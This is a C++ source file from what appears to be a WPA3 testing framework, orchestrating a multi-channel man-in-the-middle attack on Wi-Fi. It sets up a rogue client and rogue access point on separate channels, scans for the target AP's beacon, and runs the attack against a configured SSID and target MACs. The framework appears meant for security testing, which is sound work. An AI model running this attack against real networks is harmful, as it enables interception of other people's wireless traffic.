#include "attacks/by_target/scan_AP.h"
#include "attacks/components/setup_connections.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "config/RunStatus.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::mc_mitm{

    void setup_attack(RunStatus& rs){
        components::client_ap_attacker_setup(rs);

        const auto ap        = rs.get_actor("access_point");
        const auto rogue_client = rs.get_actor("rogue_client");
        const auto rogue_ap = rs.get_actor("rogue_ap");

        //TODO only for  2.4 GHz
        rogue_client->str_con["channel"] = ap["channel"];
        // rogue channel that doesn't overlap the real one - 1-11 are global valid channels //TODO check
        rogue_ap->str_con["channel"] = to_string((stoi(ap["channel"]) >= 6) ? 1 : 11);
    }

    void start_strict_tsharks(RunStatus& rs){
        const auto ap_mac = rs.get_actor("rogue_client")["mac"];
        const auto client_mac = rs.get_actor("rogue_ap")["mac"];

        const string mac_filter =
        "(wlan host "+ ap_mac +" or wlan host "+client_mac+")";

        observer::start_tshark(rs, "rogue_ap", mac_filter);
        observer::start_tshark(rs, "rogue_client", mac_filter);
    }


    void run_attack(RunStatus& rs){
        const auto rogue_client = rs.get_actor("rogue_client");
        const auto rogue_ap = rs.get_actor("rogue_ap");
        //const auto ap = rs.get_actor("access_point");
        //const auto client = rs.get_actor("client");

        auto ap_ssid = rs.config.at("attack_config").at("ssid").get<string>();
        auto ap_mac = rs.config.at("attack_config").at("target_ap_mac").get<string>();
        auto client_mac = rs.config.at("attack_config").at("target_client_mac").get<string>();

        McMitm attack(
            rogue_client["iface"], rogue_ap["iface"],
            ap_ssid,
            ap_mac, client_mac);

        //rogue_client->setup_mac_addr(ap_mac);
        //rogue_ap->setup_mac_addr(client_mac);
        rogue_client->up_iface();
        rogue_ap->up_iface();

        //TODO start_strict_tsharks(rs);
        //rs.start_observers();

        attack_scan::ScanAP scan_ap{};
        scan_ap.bssid = ap_mac;
        attack.beacon = RSN_scan(rogue_client["iface"], 10, scan_ap, path("/tmp/beacon.pcap"));
        if(attack.beacon == nullptr) throw runtime_error("beacon not found");

        //log(LogLevel::INFO, "Giving rogue AP one second to initialize ...");
        //this_thread::sleep_for(seconds(1));

        //TODO move to constrcutor
        attack.netconfig.real_channel = stoi(rogue_client["channel"]);
        attack.netconfig.rogue_channel = stoi(rogue_ap["channel"]);
        attack.netconfig.ssid = ap_ssid;
        attack.run(rs.config.at("attack_config").at("attack_time").get<int>());
    }

    void stats(const RunStatus& rs){
        //TODO
        /*vector<observer::graph_lines> events;
        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH"),"SWITCH","blue"});
        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED"),"DISCONN","red"});
        events.push_back({get_time_logs(rs, "client", "@START"),"START","black"});
        events.push_back({get_time_logs(rs, "client", "@END"),"END","black"});

        //observer::tshark_graph(rs, "client", events);
        observer::tshark_graph(rs, "rogue_ap", events);*/
    }
}
